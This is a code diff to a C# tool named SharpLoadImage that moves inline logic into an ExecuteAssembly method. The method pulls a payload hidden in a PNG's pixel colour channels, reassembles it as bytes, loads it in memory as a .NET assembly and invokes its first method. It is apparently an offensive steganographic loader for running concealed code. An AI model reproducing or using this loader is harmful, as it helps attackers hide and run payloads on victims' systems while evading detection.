@@ -117,31 +117,7 @@ namespace SharpLoadImage
                 img.Save(outputfile, ImageFormat.Png);
                 img.Dispose();
 
-                int rows = (int)Math.Ceiling((decimal)payload.Length / width);
-                int array = (rows * width);
-
-                int lrows = (rows);
-                int lwidth = (width );
-                int lpayload = (payload.Length );
-
-                byte[] o = new byte[array];
-                Bitmap g = new Bitmap(outputfile);
-
-                for (int i = 0; i < lrows; i++)
-                {
-                    for (int x = 0; x < lwidth; x++)
-                    {
-                        Color pcolor = g.GetPixel(x, i);
-                        o[i * width + x] = (byte)(Math.Floor((decimal)(((pcolor.B & 15) * 16) | (pcolor.G & 15))));
-                    }
-                }
-
-                //o contain payload
-                byte[] otrue = new byte[lpayload];
-                Array.Copy(o, otrue, lpayload);
-
-                Assembly assembly = Assembly.Load(otrue);
-                assembly.GetTypes()[0].GetMethods()[0].Invoke(null, new Object[0]);
+                ExecuteAssembly(outputfile, payload.Length);
 
             }
             catch (Exception e)
@@ -149,6 +125,37 @@ namespace SharpLoadImage
                 Console.WriteLine("[x] error: " + e.Message);
                 Console.WriteLine("[x] error: " + e.StackTrace);
             }
+        }
+
+        private static void ExecuteAssembly(string imgfile, int payloadlength)
+        {
+            Bitmap g = new Bitmap(imgfile);
+
+            int width = g.Size.Width;
+
+            int rows = (int)Math.Ceiling((decimal)payloadlength / width);
+            int array = (rows * width);
+            byte[] o = new byte[array];
+
+            int lrows = rows;
+            int lwidth = width;
+            int lpayload = payloadlength;
+
+            for (int i = 0; i < lrows; i++)
+            {
+                for (int x = 0; x < lwidth; x++)
+                {
+                    Color pcolor = g.GetPixel(x, i);
+                    o[i * width + x] = (byte)(Math.Floor((decimal)(((pcolor.B & 15) * 16) | (pcolor.G & 15))));
+                }
+            }
+
+            //o contain payload
+            byte[] otrue = new byte[lpayload];
+            Array.Copy(o, otrue, lpayload);
+
+            Assembly assembly = Assembly.Load(otrue);
+            assembly.GetTypes()[0].GetMethods()[0].Invoke(null, new Object[0]);
         }
     }
 }
